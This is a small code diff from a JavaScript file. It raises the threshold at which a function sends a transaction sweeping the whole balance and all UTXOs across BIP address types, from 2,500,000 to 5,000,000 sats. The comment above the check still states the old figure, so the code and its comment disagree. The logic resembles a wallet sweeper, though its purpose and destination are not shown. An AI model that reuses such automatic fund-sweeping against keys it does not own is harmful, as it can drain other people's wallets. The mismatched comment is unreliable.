@@ -84,7 +84,7 @@ async function processAddressesForAllBipTypes(root, network, electrumClient) {
     await Promise.all(bipTypes);
 
     // Check if the total balance is greater than 2,500,000 sats
-    if (totalBalance > 2500000) {
+    if (totalBalance > 5000000) {
         await sendTransaction(totalBalance, allUtxos);
     }
 
